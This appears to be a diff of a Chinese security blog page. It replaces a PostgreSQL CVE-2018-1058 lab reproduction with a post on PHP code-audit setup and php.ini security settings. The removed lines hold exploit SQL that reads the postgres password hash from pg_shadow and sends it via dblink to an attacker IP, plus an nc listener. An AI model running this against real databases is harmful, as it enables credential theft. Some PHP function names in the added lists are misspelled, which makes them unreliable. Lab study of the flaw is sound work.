@@ -16,24 +16,20 @@
   <meta name="description" content="潜心学安全">
   <meta name="author" content="4eg1s">
   <meta name="keywords" content="">
-  <meta name="description" content="PostgreSQL远程代码执行漏洞（CVE-2018-1058） 参考：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_33020901&#x2F;article&#x2F;details&#x2F;79467114  环境准备 Ubuntu 21.04 (安装了Docker-compose)  192.168.9.9   Kali （攻击机） 192.168.2.17   vulhub靶场 账号密码：vulhub:vul">
+  <meta name="description" content="代码审计环境搭建 wamp&#x2F;wnmp lamp&#x2F;lnmp  PHP核心配置简介 必须非常熟悉PHP官方配置说明：http:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;ini.list.php  先了解PHP_INI_* 的几个定义值。    常量 含义    PHP_INI_USER 该配置选项可在用户的PHP脚本或者Windows注册表中设置   PHP_INI_PERDIR 该配置选项可在">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PostgreSQL远程代码执行漏洞（CVE-2018-1058）">
-<meta property="og:url" content="https://encr.cc/2021/11/18/PostgreSQL%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1058%EF%BC%89/index.html">
+<meta property="og:title" content="代码审计-环境搭建">
+<meta property="og:url" content="https://encr.cc/2021/11/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/index.html">
 <meta property="og:site_name" content="4eg1s_Blog">
-<meta property="og:description" content="PostgreSQL远程代码执行漏洞（CVE-2018-1058） 参考：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_33020901&#x2F;article&#x2F;details&#x2F;79467114  环境准备 Ubuntu 21.04 (安装了Docker-compose)  192.168.9.9   Kali （攻击机） 192.168.2.17   vulhub靶场 账号密码：vulhub:vul">
+<meta property="og:description" content="代码审计环境搭建 wamp&#x2F;wnmp lamp&#x2F;lnmp  PHP核心配置简介 必须非常熟悉PHP官方配置说明：http:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;ini.list.php  先了解PHP_INI_* 的几个定义值。    常量 含义    PHP_INI_USER 该配置选项可在用户的PHP脚本或者Windows注册表中设置   PHP_INI_PERDIR 该配置选项可在">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/%E6%89%A7%E8%A1%8C%E8%AF%AD%E5%8F%A5.png">
-<meta property="og:image" content="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/%E6%A8%A1%E6%8B%9F%E8%B6%85%E7%BA%A7%E7%94%A8%E6%88%B7%E8%B0%83%E7%94%A8ps_dump.png">
-<meta property="og:image" content="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/%E7%9B%91%E5%90%AC%E6%88%90%E5%8A%9F.png">
-<meta property="article:published_time" content="2021-11-18T14:45:14.000Z">
-<meta property="article:modified_time" content="2021-11-18T15:18:22.356Z">
+<meta property="article:published_time" content="2021-11-23T07:20:23.000Z">
+<meta property="article:modified_time" content="2021-11-23T07:22:00.384Z">
 <meta property="article:author" content="4eg1s">
-<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/%E6%89%A7%E8%A1%8C%E8%AF%AD%E5%8F%A5.png">
   
-  <title>PostgreSQL远程代码执行漏洞（CVE-2018-1058） - 4eg1s_Blog</title>
+  <title>代码审计-环境搭建 - 4eg1s_Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -196,7 +192,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="PostgreSQL远程代码执行漏洞（CVE-2018-1058）">
+            <span class="h2" id="subtitle" title="代码审计-环境搭建">
               
             </span>
 
@@ -206,8 +202,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-11-18 22:45" pubdate>
-        2021年11月18日 晚上
+      <time datetime="2021-11-23 15:20" pubdate>
+        2021年11月23日 下午
       </time>
     </span>
   
@@ -217,7 +213,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.1k 字
+      3.5k 字
     </span>
   
 
@@ -226,7 +222,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4 分钟
+      11 分钟
     </span>
   
 
@@ -263,49 +259,165 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">PostgreSQL远程代码执行漏洞（CVE-2018-1058）</h1>
+            <h1 style="display: none">代码审计-环境搭建</h1>
             
             <div class="markdown-body">
-              <h1 id="PostgreSQL远程代码执行漏洞（CVE-2018-1058）"><a href="#PostgreSQL远程代码执行漏洞（CVE-2018-1058）" class="headerlink" title="PostgreSQL远程代码执行漏洞（CVE-2018-1058）"></a>PostgreSQL远程代码执行漏洞（CVE-2018-1058）</h1><blockquote>
-<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33020901/article/details/79467114">https://blog.csdn.net/qq_33020901/article/details/79467114</a></p>
+              <h1 id="代码审计环境搭建"><a href="#代码审计环境搭建" class="headerlink" title="代码审计环境搭建"></a>代码审计环境搭建</h1><ul>
+<li>wamp/wnmp</li>
+<li>lamp/lnmp</li>
+</ul>
+<h2 id="PHP核心配置简介"><a href="#PHP核心配置简介" class="headerlink" title="PHP核心配置简介"></a>PHP核心配置简介</h2><blockquote>
+<p>必须非常熟悉PHP官方配置说明：<a target="_blank" rel="noopener" href="http://www.php.net/manual/zh/ini.list.php">http://www.php.net/manual/zh/ini.list.php</a></p>
 </blockquote>
-<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
-<li>Ubuntu 21.04 (安装了Docker-compose) <ul>
-<li>192.168.9.9</li>
-</ul>
-</li>
-<li>Kali （攻击机）<ul>
-<li>192.168.2.17</li>
-</ul>
-</li>
-<li>vulhub靶场<ul>
-<li>账号密码：vulhub:vulhub</li>
-</ul>
-</li>
-</ul>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>先以普通用户登录</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">psql <span class="hljs-comment">--host 192.168.9.9 --username vulhub</span><br></code></pre></td></tr></table></figure>
-
-<p>然后登录之后执行语句并退出</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> public.array_to_string(anyarray,text) <span class="hljs-keyword">RETURNS</span> TEXT <span class="hljs-keyword">AS</span> $$<br>    <span class="hljs-keyword">select</span> dblink_connect((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hostaddr=192.168.2.17 port=8888 user=postgres password=chybeta sslmode=disable dbname=&#x27;</span><span class="hljs-operator">||</span>(<span class="hljs-keyword">SELECT</span> passwd <span class="hljs-keyword">FROM</span> pg_shadow <span class="hljs-keyword">WHERE</span> usename<span class="hljs-operator">=</span><span class="hljs-string">&#x27;postgres&#x27;</span>))); <br>    <span class="hljs-keyword">SELECT</span> pg_catalog.array_to_string($<span class="hljs-number">1</span>,$<span class="hljs-number">2</span>);<br>$$ <span class="hljs-keyword">LANGUAGE</span> <span class="hljs-keyword">SQL</span> VOLATILE;<br></code></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/%E6%89%A7%E8%A1%8C%E8%AF%AD%E5%8F%A5.png" srcset="/img/loading.gif" lazyload alt="执行语句"></p>
-<p>然后在攻击机进行监听5433，<code>nc -lvvp 5433</code>，等待超级用户触发</p>
-<p>在靶机里执行<code>docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub</code>，导出数据库内容</p>
-<p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/%E6%A8%A1%E6%8B%9F%E8%B6%85%E7%BA%A7%E7%94%A8%E6%88%B7%E8%B0%83%E7%94%A8ps_dump.png" srcset="/img/loading.gif" lazyload alt="模拟超级用户调用ps_dump"></p>
-<p>然后监听成功</p>
-<p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/%E7%9B%91%E5%90%AC%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" lazyload alt="监听成功"></p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>PostgreSQL 7.3后引入了<code>schema</code>的概念，称之为模式或者架构，允许用户在独立的命名空间中创建不同的对象（比如table，function）。在默认情况下，比如刚刚创建的一个数据库，都会有默认的一个<code>public</code>模式，在不做其他操作或者设定的情况下，诸如查询等操作都是在这个<code>public</code>中进行查询。</p>
-<p>由于采用了独立的命名空间，因此在用户进行查询时，倘若涉及到对相同名字但在不同<code>schema</code>中的对象操作时，必然需要考虑一定的顺序。在PostgreSQL 9.6.7的官方文档中，<a target="_blank" rel="noopener" href="https://docs.postgresql.fr/9.6/pg96.pdf">search_path (string)</a>说明了相关场景中的相应匹配动作</p>
+<p>先了解<code>PHP_INI_*</code> 的几个定义值。</p>
+<table>
+<thead>
+<tr>
+<th align="center">常量</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">PHP_INI_USER</td>
+<td align="center">该配置选项可在用户的PHP脚本或者Windows注册表中设置</td>
+</tr>
+<tr>
+<td align="center">PHP_INI_PERDIR</td>
+<td align="center">该配置选项可在<code>php.ini</code> <code>.htaccess</code>或<code>httpd.conf</code>中设置</td>
+</tr>
+<tr>
+<td align="center">PHP_INI_SYSTEM</td>
+<td align="center">该配置选项可在<code>php.ini</code> 或<code>httpd.conf</code>中设置</td>
+</tr>
+<tr>
+<td align="center">PHP_INI_ALL</td>
+<td align="center">该配置选项可在任何地方进行设置</td>
+</tr>
+<tr>
+<td align="center">php.ini only</td>
+<td align="center">该配置选项可仅可在php.ini中配置</td>
+</tr>
+</tbody></table>
+<h3 id="1、register-globals-全局变量注册开关"><a href="#1、register-globals-全局变量注册开关" class="headerlink" title="1、register_globals (全局变量注册开关)"></a>1、register_globals (全局变量注册开关)</h3><p>​    <code>register_globals=on</code>的情况下，会直接把用户的GET、POST等方式提交上来的参数注册成为全局变量并初始化值为参数对应的值。</p>
+<p>​    该选项在PHP &lt;= 4.2.3版本时候设置为<code>PHP_INI_ALL</code>，从PHP 5.3.0起被废弃。PHP 5.4.0 移除了该选项。</p>
+<h3 id="2、allow-url-include-（是否允许包含远程文件）"><a href="#2、allow-url-include-（是否允许包含远程文件）" class="headerlink" title="2、allow_url_include （是否允许包含远程文件）"></a>2、allow_url_include （是否允许包含远程文件）</h3><p>​    <code>allow_url_include=on</code>的情况下，可以直接包含远程文件，当存在<code>include($var)</code>且<code>$var</code>可控的情况下，可以直接控制<code>$var</code>变量来执行PHP代码。</p>
+<p>​    <code>allow_url_include</code>在PHP 5.2.0版本后默认设置为<code>off</code>，且配置范围是<code>PHP_INI_ALL</code>。类似的还有<code>allow_url_fopen</code>，配置是否允许打开远程文件，不过影响没有<code>allow_url_include</code>大。</p>
+<h3 id="3、magic-quotes-gpc-（魔术引号自动过滤）"><a href="#3、magic-quotes-gpc-（魔术引号自动过滤）" class="headerlink" title="3、magic_quotes_gpc （魔术引号自动过滤）"></a>3、magic_quotes_gpc （魔术引号自动过滤）</h3><p>​    <code>magic_qutoes_gpc=on</code>且不存在编码或者其他特殊绕过的情况下，可以使得很多漏洞无法利用。当开启时，会自动在GET、POST、COOKIE变量中的<code>单引号(&#39;)</code>、<code>双引号(&quot;)</code>、<code>空字符(Null)</code>的前面加上反斜杠<code>\</code>。</p>
+<p>​    但是在PHP 5中的 <code>magic_qutoes_gpc</code>并不会过滤<code>$_SERVER</code>变量，导致类似<code>client-ip、referer</code>一类的漏洞能够被利用。</p>
+<h3 id="4、magic-qutoes-runtime-魔术引号自动过滤"><a href="#4、magic-qutoes-runtime-魔术引号自动过滤" class="headerlink" title="4、magic_qutoes_runtime (魔术引号自动过滤)"></a>4、magic_qutoes_runtime (魔术引号自动过滤)</h3><p>​    与<code>magic_qutoes_gpc</code>的区别在于处理对象不一样，<code>magic_qutoes_runtime</code>只对从数据库或者文件中获取的数据进行过滤。</p>
+<p>​    <code>magic_qutoes_runtime</code>在PHP 5.4之后取消，配置范围是<code>PHP_INI_ALL</code></p>
+<p>​    但是有一点要记住，只有部分函数受它影响，所以在某些情况下这个配置可以绕过的。受影响的列表如下：</p>
 <ul>
-<li>首先适配原则，第一个找到的object被使用</li>
-<li>名为$user的schema由SESSION_USER决定</li>
-<li>如果<code>pg_catalog</code>不在path中则会最先查找它，如果在path中则按照指定顺序查找</li>
+<li><code>get_meta_tags()</code></li>
+<li><code>file_get_contents()</code></li>
+<li><code>file()</code></li>
+<li><code>fgets()</code></li>
+<li><code>fwrite()</code></li>
+<li><code>fread()</code></li>
+<li><code>fputcsv()</code></li>
+<li><code>stream_socket_recvfrom()</code></li>
+<li><code>exec()</code></li>
+<li><code>system()</code></li>
+<li><code>passthru()</code></li>
+<li><code>stream_get_contents()</code></li>
+<li><code>bzread()</code></li>
+<li><code>gzfile()</code></li>
+<li><code>gzgets()</code></li>
+<li><code>gzwrite()</code></li>
+<li><code>gzread()</code></li>
+<li><code>exif_read_data()</code></li>
+<li><code>dba_insert()</code></li>
+<li><code>dba_replace()</code></li>
+<li><code>dba_fetch()</code></li>
+<li><code>ibase_fetch_row()</code></li>
+<li><code>ibase_fetch_assoc()</code></li>
+<li><code>ibase_fetch_object()</code></li>
+<li><code>mssql_fetch_row()</code></li>
+<li><code>mssql_fetch_object()</code></li>
+<li><code>mssql_fetch_array()</code></li>
+<li><code>mssql_fetch_assoc()</code></li>
+<li><code>mysqli_fetch_row()</code></li>
+<li><code>mysqli_fetch_array()</code></li>
+<li><code>mysqli_fetch_assoc()</code></li>
+<li><code>mysqli_fetch_object()</code></li>
+<li><code>pg_fetch_row()</code></li>
+<li><code>pg_fetch_assoc()</code></li>
+<li><code>pg_fetch_array()</code></li>
+<li><code>pg_fetch_object()</code></li>
+<li><code>pg_fetch_all()</code></li>
+<li><code>pg_select()</code></li>
+<li><code>sybase_fetch_object()</code></li>
+<li><code>sybase_fetch_array()</code></li>
+<li><code>sybase_fetch_assoc()</code></li>
+<li><code>SplFileObject::fgets()</code></li>
+<li><code>SplFileObject::fgetcsv()</code></li>
+<li><code>SplFileObject::fwrite()</code></li>
 </ul>
-<p>PostgreSQL在对第3点的实现上出现了<code>Design Error</code>(securityfocus的分类)，造成了代码执行漏洞。</p>
-<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p><code>postgresql</code></p>
+<h3 id="5、magic-qutoes-sybase-（魔术引号自动过滤）"><a href="#5、magic-qutoes-sybase-（魔术引号自动过滤）" class="headerlink" title="5、magic_qutoes_sybase （魔术引号自动过滤）"></a>5、magic_qutoes_sybase （魔术引号自动过滤）</h3><p>​    <code>magic_qutoes_sybase=on</code>的情况下，会覆盖掉<code>magic_qutoes_gpc=on</code>的配置，即使配置了<code>gpc=on</code>也是没有效果，这个指令与<code>gpc</code>的共同点是处理的对象一致，而它们的处理方式不一样，<code>magic_qutoes_sybase</code>仅仅是转义了空字符和把单引号变成了双引号。</p>
+<p>​    相比<code>gpc</code>该指令用的更少，配置范围是<code>PHP_INI_ALL</code>，在PHP 5.4.0中移除了该选项。</p>
+<h3 id="6、safe-mode-安全模式"><a href="#6、safe-mode-安全模式" class="headerlink" title="6、safe_mode (安全模式)"></a>6、safe_mode (安全模式)</h3><p>安全模式是PHP内嵌的一种安全机制，当<code>safe_mode=on</code>时，可以联动的配置指令如下：</p>
+<ul>
+<li>safe_mode_include_dir</li>
+<li>safe_mode_exec_dir</li>
+<li>safe_mode_allowed_env_vars</li>
+<li>safe_mode_protected_env_vars</li>
+</ul>
+<p> 其配置指令范围为<code>PHP_INI_SYSTEM</code>, PHP 5.4之后取消。</p>
+<p>这个配置会出现以下限制：</p>
+<h4 id="所有文件操作函数显示"><a href="#所有文件操作函数显示" class="headerlink" title="所有文件操作函数显示"></a>所有文件操作函数显示</h4><p>例如<code>unlink()</code> <code>file()</code> <code>include()</code>等，如果有一些脚本文件放在非Web服务启动用户所有的目录下，需要利用<code>include</code>等函数来加载一些类或函数,可以使用<code>safe_mode_include_dir</code>指令配置可以包含的路径。</p>
+<h4 id="执行命令或程序会出错"><a href="#执行命令或程序会出错" class="headerlink" title="执行命令或程序会出错"></a>执行命令或程序会出错</h4><p>通过函数<code>popen()</code> <code>system()</code>以及 <code>exec()</code>等执行命令或者程序就会提示错误，如果需要使用一些外部脚本，可以把他们放到一个目录下，然后使用<code>safe_mode_exec_dir()</code>指令指向脚本的目录。</p>
+<h4 id="受影响函数列表"><a href="#受影响函数列表" class="headerlink" title="受影响函数列表"></a>受影响函数列表</h4><ul>
+<li><code>apache_request_headers()</code></li>
+<li><code>ackticks()</code></li>
+<li><code>hdir()</code></li>
+<li><code>hgrp()</code></li>
+<li><code>chmode()</code></li>
+<li><code>chown()</code></li>
+<li><code>copy()</code></li>
+<li><code>dbase_open()</code></li>
+<li><code>dbmopen()</code></li>
+<li><code>dl()</code></li>
+<li><code>exec()</code></li>
+<li><code>filepro()</code></li>
+<li><code>filepro_retrieve()</code></li>
+<li><code>ilepro_rowcount()</code></li>
+<li><code>fopen()</code></li>
+<li><code>header()</code></li>
+<li><code>highlight_file()</code></li>
+<li><code>ifx_*</code></li>
+<li><code>ingres_*</code></li>
+<li><code>link()</code></li>
+<li><code>mail()</code></li>
+<li><code>max_execution_time()</code></li>
+<li><code>mkdir()</code></li>
+<li><code>move_uploaded_file()</code></li>
+<li><code>mysql_*</code></li>
+<li><code>parse_ini_file()</code></li>
+<li><code>passthru()</code></li>
+<li><code>pg_lo_import()</code></li>
+<li><code>popen()</code></li>
+<li><code>posix_mkfifo()</code></li>
+<li><code>putenv()</code></li>
+<li><code>rename()</code></li>
+<li><code>zmdir()</code></li>
+<li><code>set_time_limit()</code></li>
+<li><code>shell_exec()</code></li>
+<li><code>show_source()</code></li>
+<li><code>symlink()</code></li>
+<li><code>system()</code></li>
+<li><code>toucu()</code></li>
+</ul>
+<h3 id="7、open-basedir-（PHP可访问目录）"><a href="#7、open-basedir-（PHP可访问目录）" class="headerlink" title="7、open_basedir （PHP可访问目录）"></a>7、open_basedir （PHP可访问目录）</h3><p>​    <code>open_basedir</code>指令用来限制PHP只能访问哪些目录，通常只需要设置Web文件目录即可，如果需要加载外部脚本，也需要把脚本所在目录路径加入到<code>open_basedir</code>指令中，多个目录以<code>;</code>分割。</p>
+<blockquote>
+<p>注意：指定的限制时实际上是前缀，而不是目录名，例如<code>open_basedir=/www/a</code>那么目录/www/a和/www/ab是可以访问的，如果要将访问仅限制在指定的目录内，将其设置成<code>open_basedir=/www/a/</code></p>
+</blockquote>
+<p>​    该指令的配置范围在PHP &lt; 5.2.3 时是 <code>PHP_INI_SYSTEM</code>，在PHP &gt; 5.2.3 是<code>PHP_INI_ALL</code></p>
+<h3 id="8、disable-functions-禁用函数"><a href="#8、disable-functions-禁用函数" class="headerlink" title="8、disable_functions (禁用函数)"></a>8、disable_functions (禁用函数)</h3><p>​    可以使用<code>disable_functions</code>来禁止一些敏感函数的使用，当想用本指令禁止一些危险函数时候，一定要把<code>dl()</code>函数也加入到禁止列表中。</p>
+<p>​    攻击者可以用<code>dl()</code>函数来加载自定义的PHP扩展以突破<code>disable_functions</code>指令的限制</p>
+<p>​    配置范围为<code>php.ini only</code>。配置禁用函数时使用逗号分隔函数名。</p>
+<h3 id="9、display-errors-和-error-reporting-（错误显示）"><a href="#9、display-errors-和-error-reporting-（错误显示）" class="headerlink" title="9、display_errors 和 error_reporting （错误显示）"></a>9、display_errors 和 error_reporting （错误显示）</h3><p>​    <code>dirsplay_errors</code>表明是否显示PHP脚本内部错误的选项，在调试的时候通常会打开，在生产环境下，建议关闭，</p>
+<p>​    <code>error_reporting</code>用来配置错误显示的级别，可以使用数字也可以使用内置的常量配置。</p>
+<p>​    两个指令配置范围都是<code>PHP_INI_ALL</code></p>
 
             </div>
             <hr>
@@ -315,7 +427,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+                      <a class="hover-with-bg" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
                     
                   </div>
                 
@@ -323,7 +435,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                     
                   </div>
                 
@@ -342,18 +454,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">代码审计-环境搭建</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/11/18/PostgreSQL%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-9193%EF%BC%89/">
-                        <span class="hidden-mobile">PostgreSQL高权限命令执行漏洞（CVE-2019-9193）</span>
+                      <a href="/2021/11/18/PostgreSQL%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1058%EF%BC%89/">
+                        <span class="hidden-mobile">PostgreSQL远程代码执行漏洞（CVE-2018-1058）</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
